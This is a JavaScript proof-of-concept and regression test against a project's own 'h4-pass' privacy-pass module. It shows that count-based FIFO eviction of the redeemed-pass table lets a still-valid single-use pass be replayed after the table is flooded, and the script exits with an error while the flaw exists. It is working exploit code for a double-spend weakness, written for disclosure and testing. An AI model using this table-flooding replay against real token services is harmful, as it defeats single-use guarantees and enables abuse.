// PoC 5: `h4-pass` "single-use" guarantee silently degrades into unlimited reuse.
//
// src/privacy-pass.js:
//   #pruneExpired(now) { if (size < 4096) return;  /* ... only scans 64 entries ... */ }
//   if (this.redeemed.size >= this.maxRedeemed)  this.redeemed.delete(FIRST key);
//
// The double-spend table is FIFO-evicted by COUNT, not by expiry. Once 100k passes
// have been redeemed inside their TTL, the oldest *still-valid* pass is forgotten and
// can be replayed. #pruneExpired only inspects 64 entries per redemption, so a busy
// server can never keep up and always hits the FIFO path.

import { PassIssuer } from '../src/privacy-pass.js';

const issuer = new PassIssuer({ ttlSec: 3600, maxRedeemed: 500 }); // 500 instead of 100k for the demo
const pass = issuer.mint();

console.log('redeem #1 :', JSON.stringify(issuer.redeem(pass)));
console.log('redeem #2 :', JSON.stringify(issuer.redeem(pass)), '  <- correctly refused');

// burn through the table (all within the 1h TTL, so nothing is actually expired)
for (let i = 0; i < 520; i++) issuer.redeem(issuer.mint());

console.log(`table size: ${issuer.redeemed.size} (cap ${issuer.maxRedeemed})`);
const third = issuer.redeem(pass);
console.log('redeem #3 :', JSON.stringify(third), third.ok ? '  *** DOUBLE SPEND ACCEPTED ***' : '  <- refused (fixed: table fails closed instead of forgetting a live pass)');
process.exit(third.ok ? 1 : 0); // exit 1 only while the vulnerability is live
